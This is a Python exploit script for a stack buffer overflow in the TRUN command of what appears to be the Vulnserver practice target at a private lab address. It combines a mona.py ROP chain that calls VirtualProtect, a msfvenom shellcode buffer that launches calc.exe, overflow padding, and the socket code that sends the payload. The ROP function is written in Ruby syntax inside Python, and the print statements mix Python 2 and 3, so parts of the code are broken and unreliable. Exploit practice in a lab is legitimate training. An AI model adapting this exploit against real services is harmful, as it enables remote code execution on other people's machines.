#!/usr/bin/python
import os
import sys
import socket
import struct
host = "192.168.56.102"
port = 9999

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x7725a30c,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x755cf451,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x77249d85,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x75753f24,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x625011bb,  # & jmp esp [essfunc.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x7576aeba,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76cfbd12,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x7595d465,  # XCHG EAX,EBX # RETN 0x02 [kernel32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x757c3836,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x4141,    # Filler (RETN offset compensation)
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76cfdae9,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x771f6d70,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x75758f01,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x77357933,  # &Writable location [WS2_32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x757495db,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76cfdaeb,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x759c784c,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x771c1052,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets



#msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f python
buf =  b""
buf += b"\xb8\x2d\xb0\xaa\x40\xdb\xc3\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x31\x83\xeb\xfc\x31\x43\x0f\x03\x43"
buf += b"\x22\x52\x5f\xbc\xd4\x10\xa0\x3d\x24\x75\x28\xd8"
buf += b"\x15\xb5\x4e\xa8\x05\x05\x04\xfc\xa9\xee\x48\x15"
buf += b"\x3a\x82\x44\x1a\x8b\x29\xb3\x15\x0c\x01\x87\x34"
buf += b"\x8e\x58\xd4\x96\xaf\x92\x29\xd6\xe8\xcf\xc0\x8a"
buf += b"\xa1\x84\x77\x3b\xc6\xd1\x4b\xb0\x94\xf4\xcb\x25"
buf += b"\x6c\xf6\xfa\xfb\xe7\xa1\xdc\xfa\x24\xda\x54\xe5"
buf += b"\x29\xe7\x2f\x9e\x99\x93\xb1\x76\xd0\x5c\x1d\xb7"
buf += b"\xdd\xae\x5f\xff\xd9\x50\x2a\x09\x1a\xec\x2d\xce"
buf += b"\x61\x2a\xbb\xd5\xc1\xb9\x1b\x32\xf0\x6e\xfd\xb1"
buf += b"\xfe\xdb\x89\x9e\xe2\xda\x5e\x95\x1e\x56\x61\x7a"
buf += b"\x97\x2c\x46\x5e\xfc\xf7\xe7\xc7\x58\x59\x17\x17"
buf += b"\x03\x06\xbd\x53\xa9\x53\xcc\x39\xa7\xa2\x42\x44"
buf += b"\x85\xa5\x5c\x47\xb9\xcd\x6d\xcc\x56\x89\x71\x07"
buf += b"\x13\x65\x38\x0a\x35\xee\xe5\xde\x04\x73\x16\x35"
buf += b"\x4a\x8a\x95\xbc\x32\x69\x85\xb4\x37\x35\x01\x24"
buf += b"\x45\x26\xe4\x4a\xfa\x47\x2d\x29\x9d\xdb\xad\x80"
buf += b"\x38\x5c\x57\xdd"


jmp_esp = "\xAF\x11\x50\x62"

rop_chain = create_rop_chain()
buffer = "A" * 2003 + rop_chain + "\x90" * 20 + buf
print (buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit"
s.send("TRUN /.:/" + buffer)
print s.recv(1024)
s.close()
